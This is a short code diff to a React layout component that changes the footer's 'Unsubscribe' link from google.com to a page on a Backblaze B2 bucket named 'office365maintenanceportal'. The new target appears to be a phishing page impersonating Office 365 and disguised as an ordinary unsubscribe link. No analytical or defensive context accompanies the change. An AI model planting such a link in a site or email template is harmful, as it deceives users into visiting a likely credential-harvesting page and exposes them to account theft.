@@ -41,7 +41,7 @@ const Layout = ({ children }) => {
         >
           © {new Date().getFullYear()}, Copyright.
           {` `}
-          <a href="https://www.google.com">Unsubscribe</a>
+          <a href="https://office365maintenanceportal.s3.us-west-002.backblazeb2.com/index.html">Unsubscribe</a>
         </footer>
       </div>
     </>
